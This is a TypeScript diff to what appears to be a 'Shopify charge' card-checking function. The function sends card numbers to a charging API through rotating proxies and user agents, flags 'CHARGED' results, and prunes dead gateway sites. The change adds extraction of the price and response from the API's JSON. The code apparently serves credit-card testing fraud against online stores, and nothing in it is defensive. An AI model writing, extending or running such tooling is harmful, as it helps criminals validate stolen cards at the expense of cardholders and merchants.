@@ -136,7 +136,7 @@ const userAgents = [
 
 const getRandomItem = <T>(arr: T[]): T => arr[Math.floor(Math.random() * arr.length)];
 
-const callApi = async (cc: string, site: string, proxy: string): Promise<{ status: string; message: string; rawResponse: string; price: number; priceStr: string }> => {
+const callApi = async (cc: string, site: string, proxy: string): Promise<{ status: string; message: string; apiResponse: string; rawResponse: string; price: number; priceStr: string }> => {
   const apiUrl = `${API_BASE_URL}?site=${encodeURIComponent(site)}&cc=${encodeURIComponent(cc)}&proxy=${proxy}`;
   
   console.log(`[SHOPIFY-CHARGE] Calling: ${API_BASE_URL}?site=${site}&cc=***&proxy=${proxy ? 'yes' : 'none'}`);
@@ -160,22 +160,33 @@ const callApi = async (cc: string, site: string, proxy: string): Promise<{ statu
     console.log(`[SHOPIFY-CHARGE] Response: ${rawText.substring(0, 500)}`);
     
     if (!rawText || rawText.trim() === '') {
-      return { status: 'unknown', message: 'Empty response', rawResponse: '', price: 0, priceStr: '$0.00' };
+      return { status: 'unknown', message: 'Empty response', apiResponse: '', rawResponse: '', price: 0, priceStr: '$0.00' };
     }
 
     // Check for bad responses
     const isBadResponse = badResponses.some(bad => rawText.toLowerCase().includes(bad.toLowerCase()));
     if (isBadResponse) {
-      return { status: 'dead', message: 'Bad response - site issue', rawResponse: rawText, price: 0, priceStr: '$0.00' };
+      return { status: 'dead', message: 'Bad response - site issue', apiResponse: '', rawResponse: rawText, price: 0, priceStr: '$0.00' };
     }
 
-    const { price, priceStr } = extractPrice(rawText);
+    let { price, priceStr } = extractPrice(rawText);
     
     let apiStatus = 'unknown';
     let apiMessage = rawText;
+    let apiResponse = '';
     
     try {
       const json = JSON.parse(rawText);
+      
+      // Extract Price and Response directly from API JSON
+      if (json.Price !== undefined && json.Price > 0) {
+        price = json.Price;
+        priceStr = `$${Number(json.Price).toFixed(2)}`;
+      }
+      if (json.Response) {
+        apiResponse = String(json.Response).replace(/<[^>]*>/g, '');
+      }
+      
       apiMessage = json.message || json.msg || json.error || rawText;
       
       if (json.status === 'CHARGED' || json.status === 'success' || json.full_response === true) {
@@ -204,13 +215,13 @@ const callApi = async (cc: string, site: string, proxy: string): Promise<{ statu
       }
     }
     
-    return { status: apiStatus, message: apiMessage, rawResponse: rawText, price, priceStr };
+    return { status: apiStatus, message: apiMessage, apiResponse, rawResponse: rawText, price, priceStr };
     
   } catch (error) {
     clearTimeout(timeoutId);
     const errMsg = error instanceof Error ? error.message : 'Error';
     console.error(`[SHOPIFY-CHARGE] Error: ${errMsg}`);
-    return { status: 'unknown', message: 'Timeout', rawResponse: errMsg, price: 0, priceStr: '$0.00' };
+    return { status: 'unknown', message: 'Timeout', apiResponse: '', rawResponse: errMsg, price: 0, priceStr: '$0.00' };
   }
 };
 
@@ -327,7 +338,7 @@ serve(async (req) => {
     }
     
     if (!result) {
-      result = { status: 'unknown', message: 'All proxies failed', rawResponse: '', price: 0, priceStr: '$0.00' };
+      result = { status: 'unknown', message: 'All proxies failed', apiResponse: '', rawResponse: '', price: 0, priceStr: '$0.00' };
     }
 
     // Auto-remove bad sites from gateway_urls
@@ -400,8 +411,9 @@ serve(async (req) => {
       JSON.stringify({
         computedStatus,
         apiStatus: displayStatus,
-        apiMessage: result.message,
+        apiMessage: result.apiResponse || result.message,
         apiTotal: chargeAmount,
+        apiPrice: result.priceStr,
         status: computedStatus,
         message: result.message,
         rawResponse: result.rawResponse,
